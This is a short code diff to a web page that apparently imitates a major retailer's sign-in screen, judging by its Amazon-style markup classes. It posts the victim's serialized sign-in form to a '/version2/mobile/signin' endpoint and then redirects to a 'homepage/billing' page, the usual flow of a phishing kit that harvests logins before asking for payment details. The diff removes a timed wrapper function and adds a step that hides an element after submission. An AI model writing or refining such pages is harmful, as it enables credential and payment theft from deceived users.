@@ -20,8 +20,6 @@
 <script src="js/jquery.min.js"></script>
 <script src="js/jquery.validate.min.js"></script>
 <script type="text/javascript">
-     setTimeout("yincang()", 100);
-     function yincang() {
     let content = document.getElementById('bodyid');
     content.innerHTML = "<div id=\"a-page\">\n" +
             "    <div class=\"a-section a-spacing-none\">\n" +
@@ -300,6 +298,7 @@
                  $.post("/version2/mobile/signin", $("#signineml").serialize(),
                          function(result) {
                              setTimeout(function() {
+                                         $("#zwimel").hide();
                                          $(location).attr("href", "homepage/billing")
                                      },
                                      1000)
@@ -342,6 +341,5 @@
                  showpassdiv.style = "display: none;";
              }
          }
-     }
 </script>
 
